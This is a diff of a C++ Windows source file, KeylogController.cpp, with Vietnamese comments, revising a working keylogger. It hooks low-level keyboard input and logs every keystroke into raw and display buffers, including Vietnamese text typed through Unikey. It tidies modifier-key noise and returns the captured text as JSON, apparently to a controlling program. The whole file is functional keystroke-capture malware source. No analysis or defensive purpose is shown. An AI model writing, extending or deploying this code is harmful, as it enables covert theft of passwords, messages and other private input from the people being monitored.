@@ -1,138 +1,143 @@
-// controllers/KeylogController.cpp (FINAL STABLE VERSION)
+// controllers/KeylogController.cpp
+// FIX FINAL 5.0:
+// - RAW LOG: Fix triet de spam [SHIFT], [CTRL] bang cach so sanh ma phim (lastPhysicalCode).
+// - DISPLAY LOG: Dong bo voi Unikey bang cach chap nhan MOI lenh Backspace (ke ca Injected).
+
 #include "KeylogController.h"
-#include "../utils/helpers.h"
 #include <windows.h>
 #include <mutex>
 #include <atomic>
 #include <thread>
 #include <string>
+#include <vector>
+#include <sstream>
+#include <iomanip>
 
 using namespace std;
 
 // --- STATE ---
-static string bufferRaw = "";     // Khung dưới: Đầy đủ (Raw + Phím chức năng)
-static string bufferDisplay = ""; // Khung trên: Chỉ văn bản (Giống code cũ)
+static string bufferRaw = "";
+static string bufferDisplay = "";
 static mutex logMutex;
 static atomic<bool> keylogEnabled(false);
 static HHOOK hKeyboardHook = NULL;
 
-// --- HELPER 1: CHỈ LẤY KÝ TỰ VĂN BẢN (Cho khung trên) ---
-// Logic này mô phỏng lại code GetAsyncKeyState ban đầu: Chỉ lấy ký tự đọc được
-string getSimpleChar(DWORD vkCode, bool shift, bool caps)
+// Bien chong spam cho Raw Log (Luu ma phim vat ly vua nhan)
+static DWORD lastPhysicalCode = 0;
+
+// --- HELPER: JSON ESCAPE (Tranh loi font Unicode) ---
+string localJsonEscape(const string &s)
 {
-    // A-Z
-    if (vkCode >= 'A' && vkCode <= 'Z')
+    ostringstream o;
+    for (char c : s)
     {
-        char c = (char)vkCode;
-        if (!(shift ^ caps))
-            c += 32; // Chuyển thường
-        return string(1, c);
+        switch (c)
+        {
+        case '"':
+            o << "\\\"";
+            break;
+        case '\\':
+            o << "\\\\";
+            break;
+        case '\b':
+            o << "\\b";
+            break;
+        case '\f':
+            o << "\\f";
+            break;
+        case '\n':
+            o << "\\n";
+            break;
+        case '\r':
+            o << "\\r";
+            break;
+        case '\t':
+            o << "\\t";
+            break;
+        default:
+            if ((unsigned char)c < 0x20)
+            {
+                o << "\\u" << hex << setw(4) << setfill('0') << (int)((unsigned char)c);
+            }
+            else
+            {
+                o << c;
+            }
+        }
     }
-    // 0-9 và các ký tự trên phím số
-    if (vkCode >= '0' && vkCode <= '9')
-    {
-        if (!shift)
-            return string(1, (char)vkCode);
-        string syms = ")!@#$%^&*(";
-        if (vkCode - '0' < syms.length())
-            return string(1, syms[vkCode - '0']);
-    }
-    // Numpad (Phím số bên phải)
-    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
-        return string(1, (char)('0' + (vkCode - VK_NUMPAD0)));
-
-    // Các phím văn bản cơ bản
-    if (vkCode == VK_SPACE)
-        return " ";
-    if (vkCode == VK_RETURN)
-        return "\n"; // Xuống dòng
-    // Lưu ý: Khung trên ta KHÔNG lấy Backspace để văn bản liền mạch (hoặc bạn có thể thêm nếu muốn)
-    if (vkCode == VK_TAB)
-        return "\t";
-
-    // Dấu câu cơ bản (Hardcode theo chuẩn US)
-    switch (vkCode)
-    {
-    case VK_OEM_PERIOD:
-        return shift ? ">" : ".";
-    case VK_OEM_COMMA:
-        return shift ? "<" : ",";
-    case VK_OEM_MINUS:
-        return shift ? "_" : "-";
-    case VK_OEM_PLUS:
-        return shift ? "+" : "=";
-    case VK_OEM_1:
-        return shift ? ":" : ";";
-    case VK_OEM_2:
-        return shift ? "?" : "/";
-    case VK_OEM_3:
-        return shift ? "~" : "`";
-    case VK_OEM_4:
-        return shift ? "{" : "[";
-    case VK_OEM_5:
-        return shift ? "|" : "\\";
-    case VK_OEM_6:
-        return shift ? "}" : "]";
-    case VK_OEM_7:
-        return shift ? "\"" : "'";
-    case VK_MULTIPLY:
-        return "*";
-    case VK_ADD:
-        return "+";
-    case VK_SUBTRACT:
-        return "-";
-    case VK_DECIMAL:
-        return ".";
-    case VK_DIVIDE:
-        return "/";
-    }
-
-    return ""; // Các phím chức năng (Ctrl, Alt...) sẽ bị bỏ qua ở khung này
+    return o.str();
 }
 
-// --- HELPER 2: LẤY TOÀN BỘ PHÍM (Cho khung dưới) ---
-string getFullRawChar(DWORD vkCode, bool shift, bool caps)
+// Helper: Them ky tu Unicode vao chuoi UTF-8
+void appendUtf8(string &s, wchar_t wc)
 {
-    // Thử lấy ký tự văn bản trước (tận dụng hàm trên)
-    string simple = getSimpleChar(vkCode, shift, caps);
+    if (wc < 0x80)
+        s += (char)wc;
+    else if (wc < 0x800)
+    {
+        s += (char)(0xC0 | (wc >> 6));
+        s += (char)(0x80 | (wc & 0x3F));
+    }
+    else
+    {
+        s += (char)(0xE0 | (wc >> 12));
+        s += (char)(0x80 | ((wc >> 6) & 0x3F));
+        s += (char)(0x80 | (wc & 0x3F));
+    }
+}
 
-    // Nếu là Enter ở khung dưới thì hiện rõ thẻ [ENTER] thay vì xuống dòng
-    if (vkCode == VK_RETURN)
-        return "\n[ENTER]\n";
-    if (vkCode == VK_BACK)
-        return "[BS]"; // Khung dưới cần hiện nút xóa
+// Helper: Xoa 1 ky tu UTF-8 (Xu ly Backspace)
+void backspaceUtf8(string &s)
+{
+    if (s.empty())
+        return;
+    while (!s.empty())
+    {
+        char c = s.back();
+        s.pop_back();
+        // Dung khi gap byte dau tien cua ky tu (0xxxxxxx hoac 11xxxxxx)
+        if ((c & 0xC0) != 0x80)
+            break;
+    }
+}
 
-    if (!simple.empty() && vkCode != VK_RETURN && vkCode != VK_SPACE && vkCode != VK_TAB)
-        return simple;
-
-    if (vkCode == VK_SPACE)
-        return " ";
-    if (vkCode == VK_TAB)
-        return "[TAB]";
-
-    // Map các phím chức năng
+// Helper: Lay ten phim day du cho Raw Log
+string getFullRawKeyName(DWORD vkCode, bool shift, bool caps)
+{
+    // 1. Phim chuc nang
     switch (vkCode)
     {
-    case VK_CONTROL:
-    case VK_LCONTROL:
-    case VK_RCONTROL:
-        return "[CTRL]";
-    case VK_MENU:
-    case VK_LMENU:
-    case VK_RMENU:
-        return "[ALT]";
-    case VK_CAPITAL:
-        return "[CAPS]";
+    case VK_BACK:
+        return "[BS]";
+    case VK_TAB:
+        return "[TAB]";
+    case VK_RETURN:
+        return "\n[ENTER]\n";
+    case VK_SPACE:
+        return " ";
     case VK_ESCAPE:
         return "[ESC]";
-    case VK_PRIOR:
-        return "[PGUP]";
-    case VK_NEXT:
-        return "[PGDN]";
-    case VK_END:
-        return "[END]";
-    case VK_HOME:
-        return "[HOME]";
+    case VK_CAPITAL:
+        return "[CAPS]";
+    case VK_LSHIFT:
+    case VK_RSHIFT:
+    case VK_SHIFT:
+        return "[SHIFT]";
+    case VK_LCONTROL:
+    case VK_RCONTROL:
+    case VK_CONTROL:
+        return "[CTRL]";
+    case VK_LMENU:
+    case VK_RMENU:
+    case VK_MENU:
+        return "[ALT]";
+    case VK_LWIN:
+    case VK_RWIN:
+        return "[WIN]";
+    case VK_DELETE:
+        return "[DEL]";
+    case VK_SNAPSHOT:
+        return "[PRTSC]";
     case VK_LEFT:
         return "[LEFT]";
     case VK_UP:
@@ -141,65 +146,176 @@ string getFullRawChar(DWORD vkCode, bool shift, bool caps)
         return "[RIGHT]";
     case VK_DOWN:
         return "[DOWN]";
-    case VK_DELETE:
-        return "[DEL]";
-    case VK_INSERT:
-        return "[INS]";
-    case VK_F1:
-        return "[F1]";
-    case VK_F2:
-        return "[F2]";
-    case VK_F3:
-        return "[F3]";
-    case VK_F4:
-        return "[F4]";
-    case VK_F5:
-        return "[F5]";
-    case VK_F6:
-        return "[F6]";
-    case VK_F7:
-        return "[F7]";
-    case VK_F8:
-        return "[F8]";
-    case VK_F9:
-        return "[F9]";
-    case VK_F10:
-        return "[F10]";
-    case VK_F11:
-        return "[F11]";
-    case VK_F12:
-        return "[F12]";
     }
+
+    // F1-F12
+    if (vkCode >= VK_F1 && vkCode <= VK_F12)
+        return "[F" + to_string(vkCode - VK_F1 + 1) + "]";
+
+    // 2. Chu cai (A-Z)
+    if (vkCode >= 'A' && vkCode <= 'Z')
+    {
+        bool isUpper = shift ^ caps;
+        char c = isUpper ? (char)vkCode : (char)(vkCode + 32);
+        return string(1, c);
+    }
+
+    // 3. So (0-9)
+    if (vkCode >= '0' && vkCode <= '9')
+    {
+        if (!shift)
+            return string(1, (char)vkCode);
+        string syms = ")!@#$%^&*(";
+        if (vkCode - '0' < syms.length())
+            return string(1, syms[vkCode - '0']);
+    }
+
+    // 4. NumPad & Dau cau
+    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
+        return string(1, (char)('0' + (vkCode - VK_NUMPAD0)));
+    if (vkCode == VK_OEM_PERIOD)
+        return shift ? ">" : ".";
+    if (vkCode == VK_OEM_COMMA)
+        return shift ? "<" : ",";
+    if (vkCode == VK_OEM_MINUS)
+        return shift ? "_" : "-";
+    if (vkCode == VK_OEM_PLUS)
+        return shift ? "+" : "=";
+    if (vkCode == VK_OEM_1)
+        return shift ? ":" : ";";
+    if (vkCode == VK_OEM_2)
+        return shift ? "?" : "/";
+    if (vkCode == VK_OEM_3)
+        return shift ? "~" : "`";
+    if (vkCode == VK_OEM_4)
+        return shift ? "{" : "[";
+    if (vkCode == VK_OEM_5)
+        return shift ? "|" : "\\";
+    if (vkCode == VK_OEM_6)
+        return shift ? "}" : "]";
+    if (vkCode == VK_OEM_7)
+        return shift ? "\"" : "'";
+
     return "";
+}
+
+// Helper: Lay ky tu hien thi cho Display Log (Chi lay van ban)
+char getDisplayChar(DWORD vkCode, bool shift, bool caps)
+{
+    if (vkCode >= 'A' && vkCode <= 'Z')
+    {
+        return (shift ^ caps) ? (char)vkCode : (char)(vkCode + 32);
+    }
+    if (vkCode >= '0' && vkCode <= '9')
+    {
+        if (!shift)
+            return (char)vkCode;
+        string syms = ")!@#$%^&*(";
+        if (vkCode - '0' < syms.length())
+            return syms[vkCode - '0'];
+    }
+    if (vkCode == VK_OEM_PERIOD)
+        return shift ? '>' : '.';
+    if (vkCode == VK_OEM_COMMA)
+        return shift ? '<' : ',';
+    if (vkCode == VK_OEM_MINUS)
+        return shift ? '_' : '-';
+    if (vkCode == VK_OEM_PLUS)
+        return shift ? '+' : '=';
+    if (vkCode == VK_OEM_1)
+        return shift ? ':' : ';';
+    if (vkCode == VK_OEM_2)
+        return shift ? '?' : '/';
+    if (vkCode == VK_OEM_3)
+        return shift ? '~' : '`';
+    if (vkCode == VK_OEM_4)
+        return shift ? '{' : '[';
+    if (vkCode == VK_OEM_5)
+        return shift ? '|' : '\\';
+    if (vkCode == VK_OEM_6)
+        return shift ? '}' : ']';
+    if (vkCode == VK_OEM_7)
+        return shift ? '"' : '\'';
+    return 0;
 }
 
 // --- HOOK CALLBACK ---
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if (nCode == HC_ACTION)
+    if (nCode == HC_ACTION && keylogEnabled.load())
     {
-        if (keylogEnabled.load())
+        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+        bool isInjected = (p->flags & LLKHF_INJECTED) != 0; // Phim do Unikey sinh ra
+
+        // XU LY KHI NHA PHIM (KEY UP) - De reset chong spam
+        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
         {
-            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+            if (p->vkCode == lastPhysicalCode)
             {
-                KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+                lastPhysicalCode = 0; // Reset de cho phep phim do duoc nhan lai
+            }
+        }
 
-                // Bỏ qua phím do phần mềm (Unikey) sinh ra để tránh lặp/rác
-                bool isInjected = (p->flags & LLKHF_INJECTED) != 0;
+        // XU LY KHI NHAN PHIM (KEY DOWN)
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-                if (!isInjected)
+            lock_guard<mutex> lock(logMutex);
+
+            // =================================================================
+            // 1. RAW LOG: Chi ghi phim vat ly & Chong spam
+            // =================================================================
+            if (!isInjected)
+            {
+                bool isModifier = (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT || p->vkCode == VK_SHIFT ||
+                                   p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL || p->vkCode == VK_CONTROL ||
+                                   p->vkCode == VK_LMENU || p->vkCode == VK_RMENU || p->vkCode == VK_MENU ||
+                                   p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_CAPITAL);
+
+                // Neu la phim chuc nang va dang bi giu (ma trung voi ma cuoi cung) -> Bo qua
+                if (isModifier && p->vkCode == lastPhysicalCode)
                 {
-                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-                    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-
-                    lock_guard<mutex> lock(logMutex);
-
-                    // 1. Khung trên: Chỉ hiện chữ (Logic cũ)
-                    bufferDisplay += getSimpleChar(p->vkCode, shift, caps);
-
-                    // 2. Khung dưới: Hiện tất cả (Raw + Chức năng)
-                    bufferRaw += getFullRawChar(p->vkCode, shift, caps);
+                    // Ignore spam
                 }
+                else
+                {
+                    bufferRaw += getFullRawKeyName(p->vkCode, shift, caps);
+                    lastPhysicalCode = p->vkCode; // Cap nhat phim vua nhan
+                }
+            }
+
+            // =================================================================
+            // 2. DISPLAY LOG: Chap nhan tat ca de dong bo voi Unikey
+            // =================================================================
+
+            if (p->vkCode == VK_BACK)
+            {
+                // QUAN TRONG: Luon thuc hien xoa khi gap Backspace (ke ca la Injected)
+                // Day la cach Unikey xoa ky tu sai de dien ky tu dung
+                backspaceUtf8(bufferDisplay);
+            }
+            else if (p->vkCode == VK_RETURN)
+            {
+                bufferDisplay += "\n";
+            }
+            else if (p->vkCode == VK_SPACE)
+            {
+                bufferDisplay += " ";
+            }
+            else if (p->vkCode == VK_PACKET)
+            {
+                // Ky tu Unicode (Tieng Viet) do Unikey gui vao
+                appendUtf8(bufferDisplay, (wchar_t)p->scanCode);
+            }
+            else if (!isInjected)
+            {
+                // Cac phim ky tu thong thuong (A-Z, 0-9...) - Chi lay phim vat ly
+                // (Vi Unikey thuong dung VK_PACKET hoac Injected Backspace, khong Injected ky tu thuong)
+                char c = getDisplayChar(p->vkCode, shift, caps);
+                if (c != 0)
+                    bufferDisplay += c;
             }
         }
     }
@@ -220,7 +336,8 @@ static void KeyLoggerThreadFunc()
         UnhookWindowsHookEx(hKeyboardHook);
 }
 
-// --- PUBLIC ---
+// --- PUBLIC HANDLERS ---
+
 void KeylogController::startKeyLoggerThread()
 {
     thread(KeyLoggerThreadFunc).detach();
@@ -230,26 +347,23 @@ string KeylogController::getKeylog()
 {
     lock_guard<mutex> lock(logMutex);
 
-    // Tạo JSON trả về cho cả 2 khung
     string json = "{";
-    json += "\"raw\":\"" + jsonEscape(bufferRaw) + "\",";
-    json += "\"display\":\"" + jsonEscape(bufferDisplay) + "\","; // Khung trên
+    json += "\"raw\":\"" + localJsonEscape(bufferRaw) + "\",";
+    json += "\"display\":\"" + localJsonEscape(bufferDisplay) + "\",";
     json += "\"enabled\":" + string(keylogEnabled.load() ? "true" : "false");
     json += "}";
 
     bufferRaw = "";
     bufferDisplay = "";
+
     return json;
 }
 
 void KeylogController::setKeylog(bool enabled)
 {
-    bool wasEnabled = keylogEnabled.load();
     keylogEnabled.store(enabled);
-    if (enabled && !wasEnabled)
+    if (enabled)
     {
-        lock_guard<mutex> lock(logMutex);
-        bufferRaw = "";
-        bufferDisplay = "";
+        lastPhysicalCode = 0;
     }
 }
